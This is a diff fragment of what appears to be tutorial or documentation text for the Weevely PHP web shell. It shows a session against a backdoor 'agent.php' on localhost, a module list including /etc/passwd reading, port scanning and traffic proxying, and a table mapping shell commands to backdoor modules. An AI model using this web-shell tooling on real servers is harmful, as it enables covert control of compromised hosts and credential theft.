@@ -81,7 +81,7 @@ weevely http://localhost/backdoor/agent.php x
 [+] Browse the filesystem or execute commands starts the connection
 [+] to the target. Type :help for more information.
 
-weevely> help
+weevely> :help
 
  :audit_etcpasswd      Get /etc/passwd with different techniques.                           
  :audit_filesystem     Audit system files for wrong permissions.                            
@@ -121,7 +121,31 @@ weevely> help
  :net_curl             Perform a curl-like HTTP request.                                    
  :net_scan             TCP Port scan.                                                       
  :net_phpproxy         Install PHP proxy on the target.                                     
- :net_proxy            Proxify local HTTP traffic passing through the target.               
+ :net_proxy            Proxify local HTTP traffic passing through the target. 
+ 
+ The system shell interpreter is not available in this session, use the
+following command replacements to simulate a unrestricted shell.
+
+ zip, unzip                                 file_zip         
+ touch                                      file_touch       
+ gzip, gunzip                               file_gzip        
+ mail                                       net_mail         
+ curl                                       net_curl         
+ nmap                                       net_scan         
+ cd                                         file_cd          
+ rm                                         file_rm          
+ cat                                        file_read        
+ ifconfig                                   shell_su         
+ vi, vim, emacs, nano, pico, gedit, kwrite  file_edit        
+ wget                                       file_webdownload 
+ find                                       file_find        
+ tar                                        file_tar         
+ ifconfig                                   net_ifconfig     
+ bzip2, bunzip2                             file_bzip2       
+ ls, dir                                    file_ls          
+ cp, copy                                   file_cp          
+ grep                                       file_grep        
+ whoami, hostname, pwd, uname               system_info                
 
 www-data@kali:/var/www/backdoor $ ls
 agent.php
